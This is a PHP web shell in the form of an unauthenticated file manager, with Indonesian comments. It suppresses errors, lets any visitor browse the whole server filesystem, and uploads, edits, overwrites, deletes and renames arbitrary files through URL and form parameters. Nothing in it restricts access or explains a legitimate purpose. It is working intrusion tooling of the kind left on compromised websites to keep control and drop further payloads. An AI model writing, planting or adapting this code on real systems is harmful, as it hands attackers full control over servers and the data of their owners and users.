<?php
set_time_limit(0);
error_reporting(0);

// Fungsi permission string
function perm($f) {
    $p = fileperms($f);
    $s = '';
    $s .= (($p & 0x8000) ? '-' : (($p & 0x4000) ? 'd' : 'l'));
    $s .= (($p & 0x0100) ? 'r' : '-');
    $s .= (($p & 0x0080) ? 'w' : '-');
    $s .= (($p & 0x0040) ? 'x' : '-');
    $s .= (($p & 0x0020) ? 'r' : '-');
    $s .= (($p & 0x0010) ? 'w' : '-');
    $s .= (($p & 0x0008) ? 'x' : '-');
    $s .= (($p & 0x0004) ? 'r' : '-');
    $s .= (($p & 0x0002) ? 'w' : '-');
    $s .= (($p & 0x0001) ? 'x' : '-');
    return $s;
}

// Fungsi cek writable
function is_w($p) {
    return is_writable($p) ? '<span class="perm-green">Writable</span>' : '<span class="perm-red">Not Writable</span>';
}

// Path handling
$path = isset($_GET['p']) ? realpath($_GET['p']) : getcwd();
if (!$path || !is_dir($path)) $path = getcwd();

$path = str_replace('\\', '/', $path);
$parts = explode('/', trim($path, '/'));

echo '<div>Path: ';
echo '<a href="?p=/">/</a>';
$accum = '/';
foreach ($parts as $part) {
    if ($part === '') continue;
    $accum .= $part . '/';
    echo '<a href="?p=' . urlencode($accum) . '">' . htmlspecialchars($part) . '</a>/';
}
echo '</div>';

echo '<div>Status: ' . is_w($path) . ' | Perm: ' . substr(sprintf('%o', fileperms($path)), -4) . '</div><br>';

// === HANDLE UPLOAD ===
if (isset($_FILES['f']) && $_FILES['f']['error'] == 0) {
    $target = $path . '/' . basename($_FILES['f']['name']);
    if (move_uploaded_file($_FILES['f']['tmp_name'], $target)) {
        echo '<div class="msg ok">File uploaded: ' . htmlspecialchars(basename($target)) . '</div>';
    } else {
        echo '<div class="msg fail">Upload failed</div>';
    }
}

// === HANDLE EDIT FILE ===
if (isset($_GET['edit'])) {
    $edit_file = realpath($_GET['edit']);
    if (is_file($edit_file) && is_readable($edit_file)) {
        if (isset($_POST['save'])) {
            $content = $_POST['content'];
            if (file_put_contents($edit_file, $content) !== false) {
                echo '<div class="msg ok">File saved successfully</div>';
            } else {
                echo '<div class="msg fail">Failed to save file (permission?)</div>';
            }
        }

        $content = file_get_contents($edit_file);
        echo '<div class="edit-area">
            <h3>Editing: ' . htmlspecialchars(basename($edit_file)) . '</h3>
            <form method="post">
                <textarea name="content">' . htmlspecialchars($content) . '</textarea><br>
                <button type="submit" name="save">Save Changes</button>
                <a href="?p=' . urlencode($path) . '" style="margin-left:15px; color:#aaa;">Cancel</a>
            </form>
        </div>';
        // Keluar setelah menampilkan editor
        goto end;
    } else {
        echo '<div class="msg fail">Cannot edit file</div>';
    }
}

// === HANDLE HAPUS FILE ===
if (isset($_GET['del'])) {
    $del_file = realpath($_GET['del']);
    if (is_file($del_file)) {
        if (@unlink($del_file)) {
            echo '<div class="msg ok">File deleted</div>';
        } else {
            echo '<div class="msg fail">Failed to delete file</div>';
        }
    } else {
        echo '<div class="msg fail">Not a file or invalid path</div>';
    }
}

// === HANDLE RENAME ===
if (isset($_GET['ren'])) {
    $ren_file = realpath($_GET['ren']);
    if (isset($_POST['newname'])) {
        $new_path = dirname($ren_file) . '/' . $_POST['newname'];
        if (@rename($ren_file, $new_path)) {
            echo '<div class="msg ok">Renamed to: ' . htmlspecialchars($_POST['newname']) . '</div>';
        } else {
            echo '<div class="msg fail">Rename failed</div>';
        }
    }
    echo '<div>
        <form method="post">
            New name: <input type="text" name="newname" value="' . htmlspecialchars(basename($ren_file)) . '" style="width:300px;">
            <button type="submit">Rename</button>
        </form>
    </div><br>';
}

// Tampilan upload
echo '<form enctype="multipart/form-data" method="post">
    <input type="file" name="f" style="color:#e0e0e0;">
    <button type="submit">Upload</button>
</form><br>';

// Daftar file & folder
echo '<table>
    <tr>
        <th>Name</th>
        <th>Size</th>
        <th>Perm</th>
        <th>Action</th>
    </tr>';

$items = scandir($path);
foreach ($items as $item) {
    if ($item == '.' || $item == '..') continue;
    $full = $path . '/' . $item;
    $is_dir = is_dir($full);
    $size = $is_dir ? '--' : round(filesize($full)/1024, 2) . ' KB';
    $perm = perm($full);
    $perm_color = (is_writable($full) ? 'perm-green' : (is_readable($full) ? '' : 'perm-red'));

    echo '<tr>
        <td>' . ($is_dir ? '<a class="dir" href="?p=' . urlencode($full) . '">' . htmlspecialchars($item) . '</a>' : '<span class="file">' . htmlspecialchars($item) . '</span>') . '</td>
        <td class="size">' . $size . '</td>
        <td><span class="' . $perm_color . '">' . $perm . '</span></td>
        <td>
            ' . ($is_dir ? '' : '<a href="?edit=' . urlencode($full) . '">Edit</a> | ') . '
            ' . ($is_dir ? '' : '<a href="?del=' . urlencode($full) . '" onclick="return confirm(\'Hapus file ini?\')">Del</a> | ') . '
            <a href="?ren=' . urlencode($full) . '">Ren</a>
        </td>
    </tr>';
}
echo '</table>';

end: // label untuk keluar dari editor
?>

</body>
